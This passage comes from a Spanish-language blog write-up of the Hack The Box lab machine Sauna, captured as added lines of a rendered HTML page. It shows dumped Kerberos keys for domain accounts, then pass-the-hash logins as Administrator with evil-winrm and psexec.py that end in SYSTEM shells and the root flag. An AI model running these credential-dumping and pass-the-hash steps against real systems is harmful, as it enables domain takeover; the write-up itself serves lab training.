+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL<span class="se">\H</span>Smith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL<span class="se">\H</span>Smith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL<span class="se">\H</span>Smith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL<span class="se">\F</span>Smith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL<span class="se">\F</span>Smith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL<span class="se">\F</span>Smith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA<span class="nv">$:</span>aes256-cts-hmac-sha1-96:49e0a6db19b412783baf04821eacc834d229043c105930d1cd1c7c78f634b95e
+SAUNA<span class="nv">$:</span>aes128-cts-hmac-sha1-96:c7561b9fa1417020d30a46705e6325e2
+SAUNA<span class="nv">$:</span>des-cbc-md5:f2fb7a4cbc2313d5
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up... 
+</code></pre></div></div>
+
+<h2 id="shell-administrator--roottxt">Shell Administrator &amp;&amp; root.txt</h2>
+
+<ul>
+  <li>Tenemos el <strong>Hash</strong>.</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">823452073d75b9d1cf70ebdf86c7f98e</code></p>
+
+<ul>
+  <li>Ahora nos vamos a conectar como el usuario <strong>administrator</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> 823452073d75b9d1cf70ebdf86c7f98e
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>egotisticalbank<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+8b4d1ef544d5e7b4deccde0952c2c9d7
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>También podemos hacerlo con esta herramienta.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 cmd.exe <span class="nt">-hashes</span> :823452073d75b9d1cf70ebdf86c7f98e
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.175.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file OVRFLufA.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.175.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service LKUE on 10.10.10.175.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service LKUE.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.973]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; 
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/easy/2024/04/03/sauna.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
